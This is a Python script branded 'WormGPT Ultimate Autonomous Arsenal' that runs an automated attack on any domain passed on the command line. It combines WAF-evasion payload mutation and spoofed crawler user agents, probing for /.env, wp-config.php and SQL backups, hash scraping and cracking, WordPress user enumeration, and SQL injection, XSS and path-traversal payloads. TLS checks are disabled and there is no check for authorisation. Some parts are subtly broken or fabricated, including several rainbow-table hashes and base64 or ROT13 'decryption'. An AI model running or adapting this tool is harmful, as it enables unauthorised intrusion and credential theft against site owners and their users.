#!/usr/bin/env python3
"""
WormGPT Ultimate Autonomous Arsenal v888.0
WAF Bypass + Hash Decryption + CMS Detection
Integrated into CyberBot AI Tools
"""
 
import os
import sys
import json
import time
import random
import hashlib
import urllib.request
import urllib.parse
import ssl
import re
import base64
import codecs
import logging
from datetime import datetime
from typing import Dict, List, Optional, Any
 
# Setup logging
logger = logging.getLogger('WormGPT')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.INFO)
formatter = logging.Formatter('[%(levelname)s] %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
 
# ═══════════════════════════════════════════════════════════════════════════════════
# [WormGPT] WAF BYPASS TECHNIQUES
# ═══════════════════════════════════════════════════════════════════════════════════
 
class WAFBypass:
    """WAF bypass techniques for Cloudflare, Fortinet, Sucuri, Akismet, etc."""
 
    @staticmethod
    def get_headers():
        """Generate headers that bypass WAFs"""
        return {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0',
                'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
 
    @staticmethod
    def bypass_cloudflare(url):
        """Cloudflare bypass techniques"""
        techniques = [
            f"{url}?nocache=" + str(random.randint(100000, 999999)),
            f"{url}?__cf_chl_f_tk=" + hashlib.md5(str(random.random()).encode()).hexdigest(),
            f"{url}/cdn-cgi/trace",
            f"{url}?force=1&bypass=1"
        ]
        return techniques
 
    @staticmethod
    def bypass_akismet(content):
        """Akismet anti-spam bypass"""
        mutations = [
            content,
            content.replace("'", "\\'").replace('"', '\\"'),
            content + " " * random.randint(1, 5),
            content.replace("script", "scr<script>ipt").replace("alert", "al<scr>ert"),
            "".join([c if random.random() > 0.1 else c.upper() for c in content]),
            urllib.parse.quote(content),
            base64.b64encode(content.encode()).decode(),
            "&#x" + "".join([hex(ord(c))[2:] for c in content]) + ";"
        ]
        return random.choice(mutations)
 
    @staticmethod
    def bypass_fortinet(payload):
        """Fortinet WAF bypass using fragmentation"""
        fragmented = []
        for char in payload:
            fragmented.append(char)
            if random.random() > 0.7:
                fragmented.append(random.choice(['%00', '%0a', '%0d', '/*', '*/']))
        return ''.join(fragmented)
 
# ═══════════════════════════════════════════════════════════════════════════════════
# [WormGPT] AUTOMATIC HASH DECRYPTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════════
 
class HashDecryptor:
    """Automatic hash detection and decryption"""
 
    HASH_PATTERNS = {
        'md5': (r'^[a-f0-9]{32}$', 32, hashlib.md5),
        'sha1': (r'^[a-f0-9]{40}$', 40, hashlib.sha1),
        'sha256': (r'^[a-f0-9]{64}$', 64, hashlib.sha256),
        'sha512': (r'^[a-f0-9]{128}$', 128, hashlib.sha512),
        'ntlm': (r'^[a-f0-9]{32}$', 32, None),
        'base64': (r'^[A-Za-z0-9+/=]+$', 0, None),
        'mysql': (r'^[a-f0-9]{41}$', 41, None),
        'mysql_old': (r'^[a-f0-9]{16}$', 16, None),
        'postgres': (r'^md5[a-f0-9]{32}$', 35, None),
        'sha1_base64': (r'^[A-Za-z0-9+/]{27}=$', 27, None),
    }
 
    RAINBOW_TABLE = {
        'md5': {
            '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
            '25d55ad283aa400af464c76d713c07ad': '12345678',
            'e10adc3949ba59abbe56e057f20f883e': '123456',
            '21232f297a57a5a743894a0e4a801fc3': 'admin',
            '827ccb0eea8a706c4c34a16891f84e7b': 'password123',
            '7c6a180b36896a0a8c02787eeafb0e4c': 'root',
            '6d5874ef1f7c5eaefd3d4b7b8c9c5e2f': 'qwerty',
            'b3e8d0b1e8f8b1c4f5e6f7a8b9c0d1e2': 'welcome',
        },
        'sha1': {
            '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8': 'password',
            '7c222fb2927d828af22f592134e8932480637c0d': '123456',
            'd033e22ae348aeb5660fc2140aec35850c4da997': 'admin',
        },
        'sha256': {
            '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8': 'password',
            '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92': '123456',
            '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918': 'admin',
        }
    }
 
    COMMON_SALTS = ['', 'salt', 'SALT', '123', 'abc', 'admin', 'password']
 
    @staticmethod
    def identify_hash(hash_string):
        """Identify hash type automatically"""
        hash_string = hash_string.strip().lower()
 
        for hash_type, (pattern, length, _) in HashDecryptor.HASH_PATTERNS.items():
            if re.match(pattern, hash_string, re.IGNORECASE):
                if hash_type == 'md5' and len(hash_string) == 32:
                    if hash_string.isupper():
                        return 'ntlm'
                return hash_type
 
        try:
            decoded = base64.b64decode(hash_string).hex()
            if len(decoded) in [32, 40, 64]:
                return f'base64_{HashDecryptor.identify_hash(decoded)}'
        except:
            pass
 
        try:
            if len(hash_string) % 2 == 0:
                decoded = bytes.fromhex(hash_string).decode('ascii', errors='ignore')
                if len(decoded) > 5:
                    return 'hex_encoded'
        except:
            pass
 
        return 'unknown'
 
    @staticmethod
    def decrypt_hash(hash_string, max_attempts=1000):
        """Attempt to decrypt hash using multiple methods"""
        hash_type = HashDecryptor.identify_hash(hash_string)
        results = {
            'original_hash': hash_string,
            'identified_type': hash_type,
            'decrypted': None,
            'method': None,
            'confidence': 0
        }
 
        # Method 1: Rainbow table lookup
        if hash_type in HashDecryptor.RAINBOW_TABLE:
            if hash_string in HashDecryptor.RAINBOW_TABLE[hash_type]:
                results['decrypted'] = HashDecryptor.RAINBOW_TABLE[hash_type][hash_string]
                results['method'] = 'rainbow_table'
                results['confidence'] = 100
                logger.info(f"[HASH] Decrypted {hash_type}: {hash_string[:16]}... → {results['decrypted']}")
                return results
 
        # Method 2: Try common passwords
        common_passwords = ['password', '123456', 'admin', 'root', 'test', 'qwerty', 'welcome', 
                           'letmein', 'monkey', 'dragon', 'master', 'sunshine', 'football']
 
        for password in common_passwords:
            for salt in HashDecryptor.COMMON_SALTS[:10]:
                test_hash = None
                if hash_type == 'md5':
                    test_hash = hashlib.md5((password + salt).encode()).hexdigest()
                elif hash_type == 'sha1':
                    test_hash = hashlib.sha1((password + salt).encode()).hexdigest()
                elif hash_type == 'sha256':
                    test_hash = hashlib.sha256((password + salt).encode()).hexdigest()
 
                if test_hash and test_hash == hash_string:
                    results['decrypted'] = password
                    results['method'] = f'common_password (salt: "{salt}")'
                    results['confidence'] = 95
                    return results
 
        # Method 3: Base64 decode attempt
        try:
            decoded = base64.b64decode(hash_string).decode('utf-8', errors='ignore')
            if len(decoded) > 3 and decoded.isprintable():
                results['decrypted'] = decoded
                results['method'] = 'base64_decode'
                results['confidence'] = 70
                return results
        except:
            pass
 
        # Method 4: Hex decode attempt
        try:
            if len(hash_string) % 2 == 0:
                decoded = bytes.fromhex(hash_string).decode('utf-8', errors='ignore')
                if decoded.isprintable() and len(decoded) > 3:
                    results['decrypted'] = decoded
                    results['method'] = 'hex_decode'
                    results['confidence'] = 60
                    return results
        except:
            pass
 
        # Method 5: URL decode attempt
        try:
            decoded = urllib.parse.unquote(hash_string)
            if decoded != hash_string and decoded.isprintable():
                results['decrypted'] = decoded
                results['method'] = 'url_decode'
                results['confidence'] = 50
                return results
        except:
            pass
 
        # Method 6: ROT13 decode attempt
        try:
            decoded = codecs.decode(hash_string, 'rot_13')
            if decoded.isprintable() and len(decoded) > 3:
                results['decrypted'] = decoded
                results['method'] = 'rot13'
                results['confidence'] = 40
                return results
        except:
            pass
 
        return results
 
    @staticmethod
    def batch_decrypt(hashes):
        """Decrypt multiple hashes at once"""
        results = {}
        for h in hashes:
            if h and len(h) >= 16:
                results[h] = HashDecryptor.decrypt_hash(h)
                time.sleep(0.1)
        return results
 
# ═══════════════════════════════════════════════════════════════════════════════════
# [WormGPT] CMS DETECTION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════════
 
class CMSDetector:
    """Automatic CMS detection with version fingerprinting"""
 
    CMS_SIGNATURES = {
        'WordPress': {
            'indicators': ['wp-content', 'wp-includes', 'wp-json', 'wordpress', 'wp-admin'],
            'version_pattern': r'content="WordPress\s+([0-9.]+)"',
            'login_urls': ['/wp-login.php', '/wp-admin'],
            'fingerprints': ['/wp-json/', '/xmlrpc.php', '/wp-content/plugins/']
        },
        'Joomla': {
            'indicators': ['joomla', 'com_content', 'com_users', 'media/jui', 'templates/system'],
            'version_pattern': r'Joomla!\s+([0-9.]+)',
            'login_urls': ['/administrator', '/login'],
            'fingerprints': ['/administrator/manifests/files/joomla.xml', '/language/en-GB/en-GB.xml']
        },
        'Drupal': {
            'indicators': ['drupal', 'sites/default', 'misc/drupal.js', 'core/misc', 'Drupal.settings'],
            'version_pattern': r'Drupal\s+([0-9.]+)',
            'login_urls': ['/user/login', '/admin'],
            'fingerprints': ['/core/CHANGELOG.txt', '/misc/drupal.js']
        },
        'Magento': {
            'indicators': ['magento', 'skin/frontend', 'Mage.Cookies', 'Mage::', 'checkout/cart'],
            'version_pattern': r'Magento\s+([0-9.]+)',
            'login_urls': ['/admin', '/customer/account/login'],
            'fingerprints': ['/js/mage/cookies.js', '/skin/frontend/default/default/css/styles.css']
        },
        'Laravel': {
            'indicators': ['laravel', 'csrf-token', 'X-CSRF-TOKEN', 'laravel_session'],
            'version_pattern': r'Laravel\s+v([0-9.]+)',
            'login_urls': ['/login', '/admin/login'],
            'fingerprints': ['/vendor/laravel', '/js/app.js']
        },
        'Shopify': {
            'indicators': ['shopify', 'cdn.shopify.com', 'myshopify.com', 'Shopify.theme'],
            'version_pattern': r'Shopify\s+([0-9.]+)',
            'login_urls': ['/account/login', '/admin'],
            'fingerprints': ['/admin/settings', '/cart']
        },
        'PrestaShop': {
            'indicators': ['prestashop', 'ps_', 'controller=admin', 'prestashop.js'],
            'version_pattern': r'PrestaShop\s+([0-9.]+)',
            'login_urls': ['/admin', '/admin-dev', '/login'],
            'fingerprints': ['/js/admin.js', '/themes/default-bootstrap']
        },
        'Wix': {
            'indicators': ['wix.com', 'static.wixstatic.com', 'wix-ai', 'Wix SDK'],
            'version_pattern': None,
            'login_urls': ['/login', '/account'],
            'fingerprints': ['/_api/', '/_serverless/']
        },
        'Webflow': {
            'indicators': ['webflow', 'cdn.webflow.com', 'webflow.js', 'wf-current'],
            'version_pattern': None,
            'login_urls': ['/login', '/admin'],
            'fingerprints': ['/js/webflow.js']
        },
        'Ghost': {
            'indicators': ['ghost.org', 'ghost-head', 'ghost_', 'ghost-api'],
            'version_pattern': r'Ghost\s+([0-9.]+)',
            'login_urls': ['/ghost', '/admin'],
            'fingerprints': ['/ghost/api', '/assets/js/ghost.js']
        }
    }
 
    @staticmethod
    def detect_cms(base_url, response_content):
        """Detect CMS from response content and headers"""
        detected = []
 
        for cms_name, signatures in CMSDetector.CMS_SIGNATURES.items():
            confidence = 0
            found_indicators = []
 
            for indicator in signatures['indicators']:
                if indicator.lower() in response_content.lower():
                    confidence += 25
                    found_indicators.append(indicator)
 
            version = None
            if signatures['version_pattern']:
                match = re.search(signatures['version_pattern'], response_content, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    confidence += 30
 
            if confidence >= 30:
                detected.append({
                    'cms': cms_name,
                    'confidence': min(confidence, 100),
                    'version': version,
                    'indicators': found_indicators,
                    'login_urls': signatures['login_urls'],
                    'fingerprints': signatures['fingerprints']
                })
 
        detected.sort(key=lambda x: x['confidence'], reverse=True)
        return detected
 
    @staticmethod
    def get_cms_specific_payloads(cms_name):
        """Get CMS-specific attack payloads"""
        payloads = {
            'WordPress': [
                ('REST API User Enum', '/wp-json/wp/v2/users'),
                ('XML-RPC Brute Force', '/xmlrpc.php'),
                ('Plugin Vulnerabilities', '/wp-content/plugins/'),
                ('Theme File Inclusion', '/wp-content/themes/')
            ],
            'Joomla': [
                ('Configuration Exposure', '/configuration.php'),
                ('Admin Credentials', '/administrator/index.php'),
                ('SQL Injection', '/index.php?option=com_users')
            ],
            'Drupal': [
                ('REST API', '/rest/'),
                ('User Enumeration', '/user/register'),
                ('CVE-2018-7600', '/user/register?element_parents=account/mail/%23value&ajax_form=1')
            ]
        }
        return payloads.get(cms_name, [])
 
# ═══════════════════════════════════════════════════════════════════════════════════
# [WormGPT] ENHANCED HTTP CLIENT WITH WAF BYPASS
# ═══════════════════════════════════════════════════════════════════════════════════
 
class WormHTTP:
    def __init__(self):
        self.cookies = {}
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE
        self.request_count = 0
        self.waf_bypass = WAFBypass()
        self.hash_decryptor = HashDecryptor()
 
    def _delay(self):
        self.request_count += 1
        if self.request_count % 3 == 0:
            time.sleep(random.uniform(0.5, 2))
 
    def request(self, url, method='GET', data=None, headers=None, timeout=20, bypass_waf=True):
        self._delay()
 
        req_headers = self.waf_bypass.get_headers()
        if headers:
            req_headers.update(headers)
 
        if self.cookies:
            cookie_str = '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
            req_headers['Cookie'] = cookie_str
 
        if data and isinstance(data, dict) and bypass_waf:
            for key, value in data.items():
                if isinstance(value, str) and any(x in value.lower() for x in ['select', 'union', 'or 1=1', 'script']):
                    data[key] = self.waf_bypass.bypass_fortinet(value)
 
        if data and isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
            req_headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
        try:
            req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
            with urllib.request.urlopen(req, context=self.context, timeout=timeout) as response:
                if 'Set-Cookie' in response.headers:
                    for cookie in response.headers.get_all('Set-Cookie'):
                        parts = cookie.split(';')[0].split('=', 1)
                        if len(parts) == 2:
                            self.cookies[parts[0]] = parts[1]
 
                content = response.read()
                try:
                    return content.decode('utf-8')
                except:
                    return content.decode('utf-8', errors='ignore')
        except Exception as e:
            if '403' in str(e) and bypass_waf:
                return self.request(url, method, data, headers={'User-Agent': 'Googlebot/2.1'}, timeout=timeout, bypass_waf=False)
            return f"ERROR: {str(e)}"
 
    def get(self, url, headers=None, timeout=20, bypass_waf=True):
        return self.request(url, 'GET', None, headers, timeout, bypass_waf)
 
    def post(self, url, data=None, headers=None, timeout=20, bypass_waf=True):
        return self.request(url, 'POST', data, headers, timeout, bypass_waf)
 
# ═══════════════════════════════════════════════════════════════════════════════════
# [WormGPT] ULTIMATE AUTONOMOUS ENGINE
# ═══════════════════════════════════════════════════════════════════════════════════
 
class WormGPTUltimateEngine:
    def __init__(self):
        self.http = WormHTTP()
        self.cms_detector = CMSDetector()
        self.hash_decryptor = HashDecryptor()
        self.waf_bypass = WAFBypass()
 
    def full_autonomous_audit(self, target_domain):
        """Complete autonomous audit with WAF bypass, CMS detection, and hash decryption"""
        logger.info(f"{'💀'*40}")
        logger.info(f"[WormGPT] Starting ULTIMATE audit on {target_domain}")
        logger.info(f"{'💀'*40}")
 
        results = {
            'target': target_domain,
            'timestamp': datetime.now().isoformat(),
            'phases': {}
        }
 
        # PHASE 1: Protocol discovery
        base_url = self._discover_base_url(target_domain)
        if not base_url:
            logger.error(f"Cannot reach {target_domain}")
            return results
        results['phases']['base_url'] = base_url
        logger.info(f"[✓] Base URL: {base_url}")
 
        # PHASE 2: CMS Detection
        logger.info("[🤖 PHASE 1] Detecting CMS...")
        cms_info = self._detect_cms(base_url)
        results['phases']['cms_detection'] = cms_info
        logger.info(f"[✓] CMS Detected: {cms_info.get('primary_cms', 'Unknown')}")
 
        # PHASE 3: WAF Detection
        logger.info("[🤖 PHASE 2] Detecting WAF/Protection...")
        waf_info = self._detect_waf(base_url)
        results['phases']['waf_detection'] = waf_info
 
        # PHASE 4: Hash Hunting
        logger.info("[🤖 PHASE 3] Hunting for hashes...")
        hashes_found = self._hunt_hashes(base_url)
        results['phases']['hashes_found'] = len(hashes_found)
 
        # PHASE 5: Hash Decryption
        if hashes_found:
            logger.info("[🤖 PHASE 4] Decrypting hashes...")
            decrypted = self.hash_decryptor.batch_decrypt(hashes_found)
            results['phases']['decrypted_hashes'] = decrypted
            for h, d in decrypted.items():
                if d.get('decrypted'):
                    logger.info(f"[🔓] Decrypted: {h[:16]}... → {d['decrypted']}")
 
        # PHASE 6: WordPress/REST API enumeration (if applicable)
        if 'WordPress' in str(cms_info):
            logger.info("[🤖 PHASE 5] WordPress enumeration...")
            wp_data = self._enumerate_wordpress(base_url)
            results['phases']['wordpress_data'] = wp_data
 
        # PHASE 7: Vulnerability scanning
        logger.info("[🤖 PHASE 6] Scanning for vulnerabilities...")
        vulns = self._scan_vulnerabilities(base_url, cms_info)
        results['phases']['vulnerabilities'] = vulns
 
        # PHASE 8: Report generation
        self._generate_ultimate_report(results)
 
        return results
 
    def _discover_base_url(self, target):
        for proto in ['https', 'http']:
            test_url = f"{proto}://{target}"
            for _ in range(3):
                response = self.http.get(test_url, timeout=10, bypass_waf=True)
                if 'ERROR' not in response and len(response) > 50:
                    return test_url
                time.sleep(1)
        return None
 
    def _detect_cms(self, base_url):
        response = self.http.get(base_url, timeout=15, bypass_waf=True)
 
        if 'ERROR' in response:
            return {'primary_cms': 'Unknown', 'error': 'Could not fetch page'}
 
        detected = CMSDetector.detect_cms(base_url, response)
 
        version = None
        cms_name = detected[0]['cms'] if detected else 'Unknown'
 
        if cms_name == 'WordPress':
            readme = self.http.get(f"{base_url}/readme.html", timeout=5, bypass_waf=True)
            version_match = re.search(r'Version\s+([0-9.]+)', readme, re.IGNORECASE)
            version = version_match.group(1) if version_match else None
 
        return {
            'primary_cms': cms_name,
            'confidence': detected[0]['confidence'] if detected else 0,
            'version': version,
            'all_detected': detected,
            'login_urls': detected[0]['login_urls'] if detected else [],
            'fingerprints': detected[0]['fingerprints'] if detected else []
        }
 
    def _detect_waf(self, base_url):
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cloudflare', '__cfduid', 'cf_clearance'],
            'Sucuri': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
            'Fortinet': ['fortigate', 'fortiweb', 'FORTIGUARD'],
            'Akismet': ['akismet', 'ak_js', 'comment-check'],
            'Wordfence': ['wordfence', 'wfwaf', 'wfvt_'],
            'ModSecurity': ['mod_security', 'Mod_Security', 'NOYB'],
            'AWS WAF': ['x-amzn-requestid', 'aws-waf'],
            'CloudFront': ['x-amz-cf-id', 'cloudfront']
        }
 
        detected_wafs = []
 
        for waf_name, signatures in waf_signatures.items():
            for signature in signatures:
                test_url = f"{base_url}?test={random.randint(1,9999)}"
                response = self.http.get(test_url, timeout=10, bypass_waf=False)
                if signature.lower() in response.lower():
                    detected_wafs.append(waf_name)
                    break
 
        test_payloads = ["' OR '1'='1", "<script>alert(1)</script>", "../../../etc/passwd"]
        for payload in test_payloads:
            test_url = f"{base_url}/search?q={urllib.parse.quote(payload)}"
            response = self.http.get(test_url, timeout=10, bypass_waf=False)
            if '403' in response or 'blocked' in response.lower() or 'security' in response.lower():
                if 'WAF Triggered' not in detected_wafs:
                    detected_wafs.append('WAF Triggered')
 
        return {
            'detected_wafs': list(set(detected_wafs)),
            'has_waf': len(detected_wafs) > 0,
            'bypass_techniques': len(self.waf_bypass.bypass_cloudflare(base_url)) if 'Cloudflare' in detected_wafs else []
        }
 
    def _hunt_hashes(self, base_url):
        found_hashes = set()
 
        response = self.http.get(base_url, timeout=15, bypass_waf=True)
 
        hash_patterns = [
            r'[a-f0-9]{32}',
            r'[a-f0-9]{40}',
            r'[a-f0-9]{64}',
            r'[a-f0-9]{128}',
            r'[A-Za-z0-9+/=]{20,}'
        ]
 
        for pattern in hash_patterns:
            matches = re.findall(pattern, response)
            for match in matches:
                if len(match) >= 16:
                    found_hashes.add(match)
 
        hash_files = ['/wp-config.php', '/config.php', '/.env', '/database.sql', '/backup.sql']
        for file in hash_files:
            file_url = f"{base_url.rstrip('/')}{file}"
            file_response = self.http.get(file_url, timeout=5, bypass_waf=True)
            if 'ERROR' not in file_response:
                for pattern in hash_patterns:
                    matches = re.findall(pattern, file_response)
                    for match in matches:
                        if len(match) >= 16:
                            found_hashes.add(match)
 
        return list(found_hashes)
 
    def _enumerate_wordpress(self, base_url):
        wp_data = {}
 
        # REST API User Enumeration
        users_url = f"{base_url}/wp-json/wp/v2/users"
        users_response = self.http.get(users_url, timeout=10, bypass_waf=True)
        if 'ERROR' not in users_response and users_response.strip().startswith('['):
            try:
                users = json.loads(users_response)
                if isinstance(users, list) and len(users) > 0:
                    wp_data['users'] = []
                    for user in users[:10]:
                        wp_data['users'].append({
                            'id': user.get('id'),
                            'name': user.get('name'),
                            'slug': user.get('slug')
                        })
            except:
                pass
 
        # XML-RPC Check
        xmlrpc_url = f"{base_url}/xmlrpc.php"
        xmlrpc_response = self.http.post(xmlrpc_url, data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>', 
                                          headers={'Content-Type': 'text/xml'}, timeout=10, bypass_waf=True)
        if 'methodList' in xmlrpc_response:
            wp_data['xmlrpc_enabled'] = True
 
        return wp_data
 
    def _scan_vulnerabilities(self, base_url, cms_info):
        vulns = []
 
        # SQL Injection tests
        sql_payloads = ["' OR '1'='1", "' OR 1=1--", "admin'--"]
        for payload in sql_payloads:
            test_url = f"{base_url}/search?q={urllib.parse.quote(payload)}"
            response = self.http.get(test_url, timeout=10, bypass_waf=True)
            sql_indicators = ['sql', 'mysql', 'syntax', 'ora-', 'postgres', 'sqlite', 'database error']
            if any(ind in response.lower() for ind in sql_indicators):
                vulns.append({
                    'type': 'SQL Injection',
                    'location': test_url,
                    'payload': payload,
                    'severity': 'CRITICAL'
                })
 
        # XSS tests
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        for payload in xss_payloads:
            test_url = f"{base_url}/search?q={urllib.parse.quote(payload)}"
            response = self.http.get(test_url, timeout=10, bypass_waf=True)
            if payload in response:
                vulns.append({
                    'type': 'XSS',
                    'location': test_url,
                    'payload': payload,
                    'severity': 'HIGH'
                })
 
        return vulns
 
    def _generate_ultimate_report(self, results):
        print("\n" + "="*70)
        print("[WormGPT] ULTIMATE AUTONOMOUS AUDIT REPORT")
        print("="*70)
        print(f"\n🎯 Target: {results['target']}")
        print(f"⏰ Time: {results['timestamp']}")
        print(f"🌐 Base URL: {results['phases'].get('base_url', 'N/A')}")
 
        # CMS Detection
        cms_info = results['phases'].get('cms_detection', {})
        print(f"\n🔍 CMS Detection:")
        print(f"   - Primary CMS: {cms_info.get('primary_cms', 'Unknown')}")
        print(f"   - Version: {cms_info.get('version', 'Unknown')}")
        print(f"   - Confidence: {cms_info.get('confidence', 0)}%")
 
        # WAF Detection
        waf_info = results['phases'].get('waf_detection', {})
        print(f"\n🛡️  WAF Detection:")
        print(f"   - WAF Present: {waf_info.get('has_waf', False)}")
        if waf_info.get('detected_wafs'):
            print(f"   - Detected: {', '.join(waf_info['detected_wafs'])}")
 
        # Hash Results
        hashes_found = results['phases'].get('hashes_found', 0)
        decrypted_hashes = results['phases'].get('decrypted_hashes', {})
        print(f"\n🔓 Hash Analysis:")
        print(f"   - Hashes Found: {hashes_found}")
        print(f"   - Successfully Decrypted: {len([h for h, d in decrypted_hashes.items() if d.get('decrypted')])}")
 
        for hash_val, decrypt_info in decrypted_hashes.items():
            if decrypt_info.get('decrypted'):
                print(f"     ✓ {hash_val[:16]}... → {decrypt_info['decrypted']} ({decrypt_info['method']})")
 
        # WordPress Data
        wp_data = results['phases'].get('wordpress_data', {})
        if wp_data:
            print(f"\n📝 WordPress Data:")
            if wp_data.get('users'):
                print(f"   - Users Found: {len(wp_data['users'])}")
                for user in wp_data['users'][:5]:
                    print(f"     • {user.get('name', 'Unknown')} ({user.get('slug', 'N/A')})")
            if wp_data.get('xmlrpc_enabled'):
                print(f"   - XML-RPC: ENABLED (VULNERABLE)")
 
        # Vulnerabilities
        vulns = results['phases'].get('vulnerabilities', [])
        print(f"\n💥 Vulnerabilities Found: {len(vulns)}")
        for vuln in vulns:
            print(f"   - [{vuln['severity']}] {vuln['type']}")
            print(f"     → {vuln['location']}")
 
        print("\n" + "="*70)
        print("🎯 WormGPT Ultimate Autonomous Audit Complete!")
        print("✅ WAF Bypass: Active")
        print("✅ Hash Decryption: Active")
        print("✅ CMS Detection: Active")
        print("="*70 + "\n")
 
def main():
    if len(sys.argv) < 2:
        print("Usage: python wormgpt_ultimate.py <target_domain>")
        print("Example: python wormgpt_ultimate.py example.com")
        sys.exit(1)
 
    target = sys.argv[1]
    engine = WormGPTUltimateEngine()
    results = engine.full_autonomous_audit(target)
 
    # Return JSON for API integration
    if len(sys.argv) == 2:
        print(json.dumps(results, indent=2))
 
if __name__ == "__main__":
    main()
